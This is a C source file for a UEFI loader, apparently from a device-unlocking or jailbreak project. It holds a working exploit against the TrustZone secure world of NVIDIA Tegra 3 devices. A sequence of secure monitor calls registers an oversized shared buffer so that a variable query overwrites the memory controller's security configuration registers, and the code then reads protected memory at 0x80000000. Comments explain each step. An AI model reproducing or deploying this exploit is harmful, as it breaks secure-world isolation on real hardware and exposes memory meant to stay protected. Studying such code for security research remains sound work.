#include <Library/UefiLib.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/DebugLib.h>
#include <Library/ArmSmcLib.h>
#include <Library/ArmLib.h>

#include "UEFILoader.h"

#ifdef TEGRA30_TRUSTZONE_EXPLOIT
UINT32
ArmCallSmcHelper(UINT32 R0, UINT32 R1, UINT32 R2, UINT32 R3)
{
  ARM_SMC_ARGS ArmSmcArgs;

  DEBUG((EFI_D_WARN, "[DEBUG] %a: >>> {0x%08x, 0x%08x, 0x%08x, 0x%08x}\n", __FUNCTION__, R0, R1, R2, R3));

  ArmSmcArgs.Arg0 = R0;
  ArmSmcArgs.Arg1 = R1;
  ArmSmcArgs.Arg2 = R2;
  ArmSmcArgs.Arg3 = R3;

  ArmCallSmc(&ArmSmcArgs);

  DEBUG((EFI_D_WARN, "[DEBUG] %a: <<< {0x%08x, 0x%08x, 0x%08x, 0x%08x}\n", __FUNCTION__, ArmSmcArgs.Arg0, ArmSmcArgs.Arg1, ArmSmcArgs.Arg2, ArmSmcArgs.Arg3));

  return ArmSmcArgs.Arg0;
}

EFI_STATUS
SecureWorldExploit()
{
  EFI_STATUS Status = EFI_SUCCESS;
  UINT32     Value  = 0;

  // Get size of the buffers needed (discarded)
  Value = ArmCallSmcHelper(0x03, 0x09, 0, 0);
  DEBUG((EFI_D_WARN, "[DEBUG] %a: ArmCallSmcHelper: 0x%x\n", __FUNCTION__, Value));

  // Switch secure world handlers to runtime mode
  Value = ArmCallSmcHelper(0x03, 0x05, 0, 0);
  DEBUG((EFI_D_WARN, "[DEBUG] %a: ArmCallSmcHelper: 0x%x\n", __FUNCTION__, Value));

  // Register a new shared memory buffer at 0x4000_0000 (IRAM) with size
  // 0x6001_e0e0. The following algorithm is used to determine the end address
  // that the QueryVariable call will write over:
  //  response_area = (request_area + (area_slice >> 1));
  Value = ArmCallSmcHelper(0x03, 0x06, 0x40000000, 0x6001e0e0);
  DEBUG((EFI_D_WARN, "[DEBUG] %a: ArmCallSmcHelper: 0x%x\n", __FUNCTION__, Value));

  // QueryVariable, does a 32 byte memory copy over to 0x7000f070...f090.
  // (MC_SECURITY_CFG0, MC_SECURITY_CFG1 and reserved registers)
  gBS->SetMem((VOID *)0x40000000, 32, 0);
  Value = ArmCallSmcHelper(0x03, 0x03, 0, 0);
  DEBUG((EFI_D_WARN, "[DEBUG] %a: ArmCallSmcHelper: 0x%x\n", __FUNCTION__, Value));

  ArmDisableCachesAndMmu();

  UINT32 Exploit = *((UINT32 *)(EFI_PHYSICAL_ADDRESS)0x80000000);

  ArmEnableMmu();
  ArmEnableDataCache();
  ArmEnableInstructionCache();

  if (Exploit == 0xFFFFFFFF) {
    Print(L"Failed to Execute Exploit at 0x80000000!\n");
    Status = EFI_UNSUPPORTED;
    goto exit;
  }

  Print(L"Exploit at 0x80000000 with: 0x%x\n", Exploit);

exit:
  return Status;
}
#endif
